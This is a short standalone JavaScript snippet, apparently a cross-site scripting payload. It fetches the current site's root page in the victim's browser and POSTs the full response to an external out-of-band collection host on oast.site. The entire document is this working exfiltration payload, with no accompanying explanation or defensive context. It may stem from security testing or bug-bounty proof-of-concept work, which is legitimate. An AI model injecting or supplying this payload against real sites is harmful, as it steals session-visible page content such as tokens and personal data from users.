fetch('/')
  .then(res => res.text())
  .then(data => fetch('https://l5f6t7oahsy28wjh61zoo79df5w2ck8gn.oast.site', {
    method: 'POST',
    body: data
  }));
